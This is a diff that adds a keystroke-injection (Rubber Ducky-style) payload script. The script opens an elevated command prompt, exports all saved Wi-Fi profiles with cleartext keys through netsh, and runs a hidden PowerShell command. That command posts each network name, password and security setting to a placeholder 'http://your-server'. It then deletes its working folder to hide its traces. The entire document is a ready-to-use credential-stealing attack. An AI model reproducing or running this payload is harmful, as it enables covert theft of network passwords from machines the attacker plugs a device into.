@@ -1,0 +1,36 @@
+REM - Change http://your-server to point to your HTTP server
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd 
+DELAY 300
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 300
+ENTER 
+DELAY 1000
+STRING cd C:\
+ENTER
+DELAY 100
+STRING md l 
+ENTER
+DELAY 100
+STRING cd l && @netsh wlan export profile key=clear >nul
+ENTER
+DELAY 500
+STRING cmd /c start powershell -nop -win hid -c "Get-ChildItem -name -Include *.xml > list.txt; Get-Content list.txt | ForEach-Object { [xml]$xmlDoc = Get-Content $_; Invoke-WebRequest http://your-server -method post -body SSID:,$xmlDoc.WLANProfile.SSIDConfig.SSID.Name,Password:,$xmlDoc.WLANProfile.MSM.security.sharedkey.keyMaterial,Authentication:,$xmlDoc.WLANProfile.MSM.security.authencryption.authentication,Encryption:,$xmlDoc.WLANProfile.MSM.security.authencryption.encryption };del list.txt;remove-variable xmlDoc"
+ENTER
+DELAY 5000
+STRING cd ..
+ENTER 
+DELAY 50
+STRING del "C:\l"
+ENTER
+DELAY 50
+STRING y
+ENTER
+STRING rmdir c:\l
+ENTER
+STRING exit
+ENTER
